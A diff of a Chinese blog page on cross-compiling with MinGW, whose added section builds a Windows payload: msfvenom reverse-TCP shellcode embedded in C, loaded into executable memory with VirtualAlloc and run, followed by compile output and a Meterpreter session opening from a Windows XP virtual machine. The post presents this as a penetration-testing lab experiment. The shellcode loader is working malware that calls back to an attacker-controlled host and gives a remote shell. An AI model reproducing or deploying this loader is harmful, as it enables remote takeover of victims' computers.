@@ -285,6 +285,24 @@ Hugo Theme <a href="https://github.com/amazingrise/hugo-theme-diary">Diary</a> b
 					
 				
 			
+				
+				
+					
+						
+						
+						
+						
+						
+							<li>
+								<a href="#%e6%a3%80%e9%aa%8c" onclick="onNavClick(`#检验-nav`)" id="检验-nav">
+									检验
+								</a>
+							</li>
+						
+						
+					
+				
+			
 		</ul>
 	</div>
 
@@ -450,6 +468,24 @@ Hugo Theme <a href="https://github.com/amazingrise/hugo-theme-diary">Diary</a> b
 					
 				
 			
+				
+				
+					
+						
+						
+						
+						
+						
+							<li>
+								<a href="#%e6%a3%80%e9%aa%8c" onclick="onNavClick(`#检验-nav`)" id="检验-nav">
+									检验
+								</a>
+							</li>
+						
+						
+					
+				
+			
 		</ul>
 	</div>
 
@@ -551,6 +587,9 @@ Hugo Theme <a href="https://github.com/amazingrise/hugo-theme-diary">Diary</a> b
                                 <a href="/tags/windows">Windows</a>
                                 &nbsp;
                             
+                                <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95">渗透测试</a>
+                                &nbsp;
+                            
                         
                         
                     </div>
@@ -587,41 +626,133 @@ Hugo Theme <a href="https://github.com/amazingrise/hugo-theme-diary">Diary</a> b
 <p>我这里选择 1 2 3 4 5</p>
 <h2 id="开始编译">开始编译</h2>
 <p>那么， 装完之后就可以开始编译了</p>
-<p>这次我打算把上次糊的一个东西编译一下</p>
-<ul>
-<li><a href="https://github.com/Aozaki-Club/about-doggy">GitHub - Aozaki-Club/about-doggy</a></li>
-</ul>
-<p>嗯&hellip; 就是这玩意</p>
-<p>新建一个目录然后 cd 进去</p>
-<div class="highlight"><pre style="color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">$ mkdir build
-</code></pre></div><div class="highlight"><pre style="color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">$ cd build
-</code></pre></div><p>把代码拉下来</p>
-<p>别问为什么不从自己硬盘里找，问就是懒（不是</p>
-<div class="highlight"><pre style="color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">$ git clone https://github.com/Aozaki-Club/about-doggy.git
-</code></pre></div><p>再 cd 进去</p>
-<div class="highlight"><pre style="color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">$ cd about-doggy
-</code></pre></div><p>接下来我们可以看到这些文件</p>
-<div class="highlight"><pre style="color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">$ ls -ahl
-总用量 48K
-drwxr-xr-x 3 weepingdogel weepingdogel 4.0K Apr 26 14:39 .
-drwxr-xr-x 3 weepingdogel weepingdogel 4.0K Apr 26 14:39 ..
--rw-r--r-- 1 weepingdogel weepingdogel 2.1K Apr 26 14:39 about-doggy.c
-drwxr-xr-x 8 weepingdogel weepingdogel 4.0K Apr 26 14:39 .git
--rw-r--r-- 1 weepingdogel weepingdogel  26K Apr 26 14:39 LICENSE
--rw-r--r-- 1 weepingdogel weepingdogel   95 Apr 26 14:39 README.md
-</code></pre></div><p>接下来我们需要安装 <code>mingw-w64-gtk3</code> 这个包，否则就会报错</p>
-<div class="highlight"><pre style="color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">$ x86_64-w64-mingw32-gcc text.c -o test.exe `pkg-config --cflags --libs gtk+-3.0`
-</code></pre></div><div class="highlight"><pre style="color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">/usr/lib/gcc/x86_64-w64-mingw32/10.2.0/../../../../x86_64-w64-mingw32/bin/ld: cannot find -lgtk-3
-/usr/lib/gcc/x86_64-w64-mingw32/10.2.0/../../../../x86_64-w64-mingw32/bin/ld: cannot find -lgdk-3
-/usr/lib/gcc/x86_64-w64-mingw32/10.2.0/../../../../x86_64-w64-mingw32/bin/ld: cannot find -lpangocairo-1.0
-/usr/lib/gcc/x86_64-w64-mingw32/10.2.0/../../../../x86_64-w64-mingw32/bin/ld: cannot find -lpango-1.0
-/usr/lib/gcc/x86_64-w64-mingw32/10.2.0/../../../../x86_64-w64-mingw32/bin/ld: cannot find -lharfbuzz
-/usr/lib/gcc/x86_64-w64-mingw32/10.2.0/../../../../x86_64-w64-mingw32/bin/ld: cannot find -lcairo-gobject
-/usr/lib/gcc/x86_64-w64-mingw32/10.2.0/../../../../x86_64-w64-mingw32/bin/ld: cannot find -lcairo
-collect2: 错误：ld 返回 1
-</code></pre></div><p>Arch 的话，需要使用 <code>yay</code> 从 aur 中安装这个包，但是&hellip;.. 我试了一下，大多数依赖都在 aur 里，然后要编译一百多个&hellip;. 实在过于难受，因此我选择了 <code>mingw-w64-gtk3-bin</code> 这个包。</p>
-<div class="highlight"><pre style="color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">$ yay -S mingw-w64-gtk3-bin
-</code></pre></div>
+<p>我打算编译一个 payload 试试看，嘿嘿</p>
+<p>首先我们先用 <code>msfvenom</code> 生成一段 <code>shellcode</code></p>
+<div class="highlight"><pre style="color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#cdcaa9;font-weight:bold">unsigned</span> <span style="color:#cdcaa9;font-weight:bold">char</span> buf[] = 
+<span style="color:#0086d2">&#34;</span><span style="color:#0086d2">\xfc\xe8\x8f\x00\x00\x00\x60\x31\xd2\x89\xe5\x64\x8b\x52\x30</span><span style="color:#0086d2">&#34;</span>
+<span style="color:#0086d2">&#34;</span><span style="color:#0086d2">\x8b\x52\x0c\x8b\x52\x14\x0f\xb7\x4a\x26\x31\xff\x8b\x72\x28</span><span style="color:#0086d2">&#34;</span>
+<span style="color:#0086d2">&#34;</span><span style="color:#0086d2">\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\x49</span><span style="color:#0086d2">&#34;</span>
+<span style="color:#0086d2">&#34;</span><span style="color:#0086d2">\x75\xef\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78</span><span style="color:#0086d2">&#34;</span>
+<span style="color:#0086d2">&#34;</span><span style="color:#0086d2">\x85\xc0\x74\x4c\x01\xd0\x8b\x48\x18\x8b\x58\x20\x50\x01\xd3</span><span style="color:#0086d2">&#34;</span>
+<span style="color:#0086d2">&#34;</span><span style="color:#0086d2">\x85\xc9\x74\x3c\x31\xff\x49\x8b\x34\x8b\x01\xd6\x31\xc0\xac</span><span style="color:#0086d2">&#34;</span>
+<span style="color:#0086d2">&#34;</span><span style="color:#0086d2">\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24</span><span style="color:#0086d2">&#34;</span>
+<span style="color:#0086d2">&#34;</span><span style="color:#0086d2">\x75\xe0\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c</span><span style="color:#0086d2">&#34;</span>
+<span style="color:#0086d2">&#34;</span><span style="color:#0086d2">\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59</span><span style="color:#0086d2">&#34;</span>
+<span style="color:#0086d2">&#34;</span><span style="color:#0086d2">\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12\xe9\x80\xff\xff\xff\x5d</span><span style="color:#0086d2">&#34;</span>
+<span style="color:#0086d2">&#34;</span><span style="color:#0086d2">\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c\x77\x26</span><span style="color:#0086d2">&#34;</span>
+<span style="color:#0086d2">&#34;</span><span style="color:#0086d2">\x07\x89\xe8\xff\xd0\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68</span><span style="color:#0086d2">&#34;</span>
+<span style="color:#0086d2">&#34;</span><span style="color:#0086d2">\x29\x80\x6b\x00\xff\xd5\x6a\x0a\x68\x6d\xa6\x24\x38\x68\x02</span><span style="color:#0086d2">&#34;</span>
+<span style="color:#0086d2">&#34;</span><span style="color:#0086d2">\x00\x35\x16\x89\xe6\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea</span><span style="color:#0086d2">&#34;</span>
+<span style="color:#0086d2">&#34;</span><span style="color:#0086d2">\x0f\xdf\xe0\xff\xd5\x97\x6a\x10\x56\x57\x68\x99\xa5\x74\x61</span><span style="color:#0086d2">&#34;</span>
+<span style="color:#0086d2">&#34;</span><span style="color:#0086d2">\xff\xd5\x85\xc0\x74\x0a\xff\x4e\x08\x75\xec\xe8\x67\x00\x00</span><span style="color:#0086d2">&#34;</span>
+<span style="color:#0086d2">&#34;</span><span style="color:#0086d2">\x00\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x83</span><span style="color:#0086d2">&#34;</span>
+<span style="color:#0086d2">&#34;</span><span style="color:#0086d2">\xf8\x00\x7e\x36\x8b\x36\x6a\x40\x68\x00\x10\x00\x00\x56\x6a</span><span style="color:#0086d2">&#34;</span>
+<span style="color:#0086d2">&#34;</span><span style="color:#0086d2">\x00\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53\x6a\x00\x56\x53\x57</span><span style="color:#0086d2">&#34;</span>
+<span style="color:#0086d2">&#34;</span><span style="color:#0086d2">\x68\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58\x68\x00</span><span style="color:#0086d2">&#34;</span>
+<span style="color:#0086d2">&#34;</span><span style="color:#0086d2">\x40\x00\x00\x6a\x00\x50\x68\x0b\x2f\x0f\x30\xff\xd5\x57\x68</span><span style="color:#0086d2">&#34;</span>
+<span style="color:#0086d2">&#34;</span><span style="color:#0086d2">\x75\x6e\x4d\x61\xff\xd5\x5e\x5e\xff\x0c\x24\x0f\x85\x70\xff</span><span style="color:#0086d2">&#34;</span>
+<span style="color:#0086d2">&#34;</span><span style="color:#0086d2">\xff\xff\xe9\x9b\xff\xff\xff\x01\xc3\x29\xc6\x75\xc1\xc3\xbb</span><span style="color:#0086d2">&#34;</span>
+<span style="color:#0086d2">&#34;</span><span style="color:#0086d2">\xf0\xb5\xa2\x56\x6a\x00\x53\xff\xd5</span><span style="color:#0086d2">&#34;</span>;
+</code></pre></div><p>然后编写我们的代码</p>
+<div class="highlight"><pre style="color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#ff0007;background-color:#0f140f;font-weight:bold;font-style:italic">#include</span><span style="color:#ff0007;background-color:#0f140f;font-weight:bold;font-style:italic">&lt;windows.h&gt;</span><span style="color:#ff0007;background-color:#0f140f;font-weight:bold;font-style:italic">
+</span><span style="color:#ff0007;background-color:#0f140f;font-weight:bold;font-style:italic">#include</span><span style="color:#ff0007;background-color:#0f140f;font-weight:bold;font-style:italic">&lt;stdio.h&gt;</span><span style="color:#ff0007;background-color:#0f140f;font-weight:bold;font-style:italic">
+</span><span style="color:#ff0007;background-color:#0f140f;font-weight:bold;font-style:italic"></span>
+<span style="color:#cdcaa9;font-weight:bold">unsigned</span> <span style="color:#cdcaa9;font-weight:bold">char</span> shellcode[] =
+<span style="color:#0086d2">&#34;</span><span style="color:#0086d2">\xfc\xe8\x8f\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30</span><span style="color:#0086d2">&#34;</span>
+<span style="color:#0086d2">&#34;</span><span style="color:#0086d2">\x8b\x52\x0c\x8b\x52\x14\x0f\xb7\x4a\x26\x8b\x72\x28\x31\xff</span><span style="color:#0086d2">&#34;</span>
+<span style="color:#0086d2">&#34;</span><span style="color:#0086d2">\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\x49</span><span style="color:#0086d2">&#34;</span>
+<span style="color:#0086d2">&#34;</span><span style="color:#0086d2">\x75\xef\x52\x8b\x52\x10\x8b\x42\x3c\x57\x01\xd0\x8b\x40\x78</span><span style="color:#0086d2">&#34;</span>
+<span style="color:#0086d2">&#34;</span><span style="color:#0086d2">\x85\xc0\x74\x4c\x01\xd0\x50\x8b\x48\x18\x8b\x58\x20\x01\xd3</span><span style="color:#0086d2">&#34;</span>
+<span style="color:#0086d2">&#34;</span><span style="color:#0086d2">\x85\xc9\x74\x3c\x31\xff\x49\x8b\x34\x8b\x01\xd6\x31\xc0\xc1</span><span style="color:#0086d2">&#34;</span>
+<span style="color:#0086d2">&#34;</span><span style="color:#0086d2">\xcf\x0d\xac\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24</span><span style="color:#0086d2">&#34;</span>
+<span style="color:#0086d2">&#34;</span><span style="color:#0086d2">\x75\xe0\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c</span><span style="color:#0086d2">&#34;</span>
+<span style="color:#0086d2">&#34;</span><span style="color:#0086d2">\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59</span><span style="color:#0086d2">&#34;</span>
+<span style="color:#0086d2">&#34;</span><span style="color:#0086d2">\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12\xe9\x80\xff\xff\xff\x5d</span><span style="color:#0086d2">&#34;</span>
+<span style="color:#0086d2">&#34;</span><span style="color:#0086d2">\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c\x77\x26</span><span style="color:#0086d2">&#34;</span>
+<span style="color:#0086d2">&#34;</span><span style="color:#0086d2">\x07\x89\xe8\xff\xd0\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68</span><span style="color:#0086d2">&#34;</span>
+<span style="color:#0086d2">&#34;</span><span style="color:#0086d2">\x29\x80\x6b\x00\xff\xd5\x6a\x0a\x68\xc0\xa8\x00\x70\x68\x02</span><span style="color:#0086d2">&#34;</span>
+<span style="color:#0086d2">&#34;</span><span style="color:#0086d2">\x00\x0d\x05\x89\xe6\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea</span><span style="color:#0086d2">&#34;</span>
+<span style="color:#0086d2">&#34;</span><span style="color:#0086d2">\x0f\xdf\xe0\xff\xd5\x97\x6a\x10\x56\x57\x68\x99\xa5\x74\x61</span><span style="color:#0086d2">&#34;</span>
+<span style="color:#0086d2">&#34;</span><span style="color:#0086d2">\xff\xd5\x85\xc0\x74\x0a\xff\x4e\x08\x75\xec\xe8\x67\x00\x00</span><span style="color:#0086d2">&#34;</span>
+<span style="color:#0086d2">&#34;</span><span style="color:#0086d2">\x00\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x83</span><span style="color:#0086d2">&#34;</span>
+<span style="color:#0086d2">&#34;</span><span style="color:#0086d2">\xf8\x00\x7e\x36\x8b\x36\x6a\x40\x68\x00\x10\x00\x00\x56\x6a</span><span style="color:#0086d2">&#34;</span>
+<span style="color:#0086d2">&#34;</span><span style="color:#0086d2">\x00\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53\x6a\x00\x56\x53\x57</span><span style="color:#0086d2">&#34;</span>
+<span style="color:#0086d2">&#34;</span><span style="color:#0086d2">\x68\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58\x68\x00</span><span style="color:#0086d2">&#34;</span>
+<span style="color:#0086d2">&#34;</span><span style="color:#0086d2">\x40\x00\x00\x6a\x00\x50\x68\x0b\x2f\x0f\x30\xff\xd5\x57\x68</span><span style="color:#0086d2">&#34;</span>
+<span style="color:#0086d2">&#34;</span><span style="color:#0086d2">\x75\x6e\x4d\x61\xff\xd5\x5e\x5e\xff\x0c\x24\x0f\x85\x70\xff</span><span style="color:#0086d2">&#34;</span>
+<span style="color:#0086d2">&#34;</span><span style="color:#0086d2">\xff\xff\xe9\x9b\xff\xff\xff\x01\xc3\x29\xc6\x75\xc1\xc3\xbb</span><span style="color:#0086d2">&#34;</span>
+<span style="color:#0086d2">&#34;</span><span style="color:#0086d2">\xf0\xb5\xa2\x56\x6a\x00\x53\xff\xd5</span><span style="color:#0086d2">&#34;</span>;
+
+<span style="color:#cdcaa9;font-weight:bold">void</span> <span style="color:#ff0086;font-weight:bold">main</span>(){
+    printf(<span style="color:#0086d2">&#34;啊哈！你中毒啦！&#34;</span>);
+    <span style="color:#080;background-color:#0f140f;font-style:italic">//ShellExecute(NULL, _T(&#34;open&#34;), _T(&#34;explorer.exe&#34;), _T(&#34;https://www.baiud.com&#34;), NULL, SW_SHOW);
+</span><span style="color:#080;background-color:#0f140f;font-style:italic"></span>    LPVOID Memory = VirtualAlloc(NULL, <span style="color:#fb660a;font-weight:bold">sizeof</span>(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    memcpy(Memory, shellcode, <span style="color:#fb660a;font-weight:bold">sizeof</span>(shellcode));
+    ((<span style="color:#cdcaa9;font-weight:bold">void</span>(*)())Memory)();
+}
+</code></pre></div><blockquote>
+<p>PS: 这是抄的(bushi)</p>
+</blockquote>
+<p>接下来进行编译</p>
+<div class="highlight"><pre style="color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">$ i686-w64-mingw32-gcc-10.2.0 payload.c -o payload.exe -v
+</code></pre></div><div class="highlight"><pre style="color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">使用内建 specs。
+COLLECT_GCC=i686-w64-mingw32-gcc-10.2.0
+COLLECT_LTO_WRAPPER=/usr/lib/gcc/i686-w64-mingw32/10.2.0/lto-wrapper
+目标：i686-w64-mingw32
+配置为：/build/mingw-w64-gcc/src/gcc/configure --prefix=/usr --libexecdir=/usr/lib --target=i686-w64-mingw32 --with-bugurl=https://bugs.archlinux.org/ --enable-languages=c,lto,c++,ada,objc,obj-c++,fortran --enable-shared --enable-static --enable-threads=posix --enable-fully-dynamic-string --enable-libstdcxx-time=yes --enable-libstdcxx-filesystem-ts=yes --with-system-zlib --enable-cloog-backend=isl --enable-lto --enable-libgomp --disable-multilib --enable-checking=release --disable-sjlj-exceptions --with-dwarf2
+线程模型：posix
+Supported LTO compression algorithms: zlib zstd
+gcc 版本 10.2.0 (GCC) 
+COLLECT_GCC_OPTIONS=&#39;-o&#39; &#39;payload.exe&#39; &#39;-v&#39; &#39;-mtune=generic&#39; &#39;-march=pentiumpro&#39;
+ /usr/lib/gcc/i686-w64-mingw32/10.2.0/cc1 -quiet -v -D_REENTRANT payload.c -quiet -dumpbase payload.c -mtune=generic -march=pentiumpro -auxbase payload -version -o /tmp/ccMByM5H.s
+GNU C17 (GCC) 版本 10.2.0 (i686-w64-mingw32)
+	由 GNU C 版本 10.2.0 编译，GMP 版本 6.2.0，MPFR 版本 4.1.0，MPC 版本 1.1.0，isl 版本 isl-0.21-GMP
+
+警告：GMP 头文件版本 6.2.0 与库版本 6.2.1 不同。
+警告：MPC 头文件版本 1.1.0 与库版本 1.2.1 不同。
+GGC 准则：--param ggc-min-expand=100 --param ggc-min-heapsize=131072
+忽略不存在的目录“/usr/lib/gcc/i686-w64-mingw32/10.2.0/../../../../i686-w64-mingw32/sys-include”
+#include &#34;...&#34; 搜索从这里开始：
+#include &lt;...&gt; 搜索从这里开始：
+ /usr/lib/gcc/i686-w64-mingw32/10.2.0/include
+ /usr/lib/gcc/i686-w64-mingw32/10.2.0/include-fixed
+ /usr/lib/gcc/i686-w64-mingw32/10.2.0/../../../../i686-w64-mingw32/include
+搜索列表结束。
+GNU C17 (GCC) 版本 10.2.0 (i686-w64-mingw32)
+	由 GNU C 版本 10.2.0 编译，GMP 版本 6.2.0，MPFR 版本 4.1.0，MPC 版本 1.1.0，isl 版本 isl-0.21-GMP
+
+警告：GMP 头文件版本 6.2.0 与库版本 6.2.1 不同。
+警告：MPC 头文件版本 1.1.0 与库版本 1.2.1 不同。
+GGC 准则：--param ggc-min-expand=100 --param ggc-min-heapsize=131072
+Compiler executable checksum: ded9fca0c6f5f53dad787dacd8ef9b9f
+COLLECT_GCC_OPTIONS=&#39;-o&#39; &#39;payload.exe&#39; &#39;-v&#39; &#39;-mtune=generic&#39; &#39;-march=pentiumpro&#39;
+ /usr/lib/gcc/i686-w64-mingw32/10.2.0/../../../../i686-w64-mingw32/bin/as -v -o /tmp/ccvhBE4k.o /tmp/ccMByM5H.s
+GNU assembler version 2.35.1 (i686-w64-mingw32) using BFD version (GNU Binutils) 2.35.1
+COMPILER_PATH=/usr/lib/gcc/i686-w64-mingw32/10.2.0/:/usr/lib/gcc/i686-w64-mingw32/10.2.0/:/usr/lib/gcc/i686-w64-mingw32/:/usr/lib/gcc/i686-w64-mingw32/10.2.0/:/usr/lib/gcc/i686-w64-mingw32/:/usr/lib/gcc/i686-w64-mingw32/10.2.0/../../../../i686-w64-mingw32/bin/
+LIBRARY_PATH=/usr/lib/gcc/i686-w64-mingw32/10.2.0/:/usr/lib/gcc/i686-w64-mingw32/10.2.0/../../../../i686-w64-mingw32/lib/../lib/:/usr/lib/gcc/i686-w64-mingw32/10.2.0/../../../../i686-w64-mingw32/lib/
+COLLECT_GCC_OPTIONS=&#39;-o&#39; &#39;payload.exe&#39; &#39;-v&#39; &#39;-mtune=generic&#39; &#39;-march=pentiumpro&#39;
+ /usr/lib/gcc/i686-w64-mingw32/10.2.0/collect2 -plugin /usr/lib/gcc/i686-w64-mingw32/10.2.0/liblto_plugin.so -plugin-opt=/usr/lib/gcc/i686-w64-mingw32/10.2.0/lto-wrapper -plugin-opt=-fresolution=/tmp/cch6fKzn.res -plugin-opt=-pass-through=-lmingw32 -plugin-opt=-pass-through=-lgcc -plugin-opt=-pass-through=-lgcc_eh -plugin-opt=-pass-through=-lmoldname -plugin-opt=-pass-through=-lmingwex -plugin-opt=-pass-through=-lmsvcrt -plugin-opt=-pass-through=-lpthread -plugin-opt=-pass-through=-ladvapi32 -plugin-opt=-pass-through=-lshell32 -plugin-opt=-pass-through=-luser32 -plugin-opt=-pass-through=-lkernel32 -plugin-opt=-pass-through=-lmingw32 -plugin-opt=-pass-through=-lgcc -plugin-opt=-pass-through=-lgcc_eh -plugin-opt=-pass-through=-lmoldname -plugin-opt=-pass-through=-lmingwex -plugin-opt=-pass-through=-lmsvcrt -m i386pe -Bdynamic -o payload.exe /usr/lib/gcc/i686-w64-mingw32/10.2.0/../../../../i686-w64-mingw32/lib/../lib/crt2.o /usr/lib/gcc/i686-w64-mingw32/10.2.0/crtbegin.o -L/usr/lib/gcc/i686-w64-mingw32/10.2.0 -L/usr/lib/gcc/i686-w64-mingw32/10.2.0/../../../../i686-w64-mingw32/lib/../lib -L/usr/lib/gcc/i686-w64-mingw32/10.2.0/../../../../i686-w64-mingw32/lib /tmp/ccvhBE4k.o -lmingw32 -lgcc -lgcc_eh -lmoldname -lmingwex -lmsvcrt -lpthread -ladvapi32 -lshell32 -luser32 -lkernel32 -lmingw32 -lgcc -lgcc_eh -lmoldname -lmingwex -lmsvcrt /usr/lib/gcc/i686-w64-mingw32/10.2.0/crtend.o
+COLLECT_GCC_OPTIONS=&#39;-o&#39; &#39;payload.exe&#39; &#39;-v&#39; &#39;-mtune=generic&#39; &#39;-march=pentiumpro&#39;
+</code></pre></div><p>没有任何报错之后，丢进虚拟机里运行, 如果 meterpreter 能够上线则说明编译是有效的</p>
+<h2 id="检验">检验</h2>
+<p><img src="/img/2021-05-07-18-18-28%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt=""></p>
+<div class="highlight"><pre style="color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">[*] Started reverse TCP handler on 192.168.0.112:3333 
+[*] Sending stage (175174 bytes) to 192.168.0.113
+[*] Meterpreter session 1 opened (192.168.0.112:3333 -&gt; 192.168.0.113:1045) at 2021-05-07 18:18:17 +0800
+
+meterpreter &gt; sysinfo
+Computer        : CHINA-74ED62096
+OS              : Windows XP (5.1 Build 2600, Service Pack 3).
+Architecture    : x86
+System Language : zh_CN
+Domain          : WORKGROUP
+Logged On Users : 2
+Meterpreter     : x86/windows
+meterpreter &gt; 
+</code></pre></div><p>我们直接丢进去跑&hellip;</p>
+<p>emmm 虽然字乱码了。</p>
+<p>不过连接是建立了，那么说明编译是有效的～</p>
+
                     
                     <HR width="100%" id="EOF">
 		    <p style="color:#777;">最后修改于 2021-04-26</p>
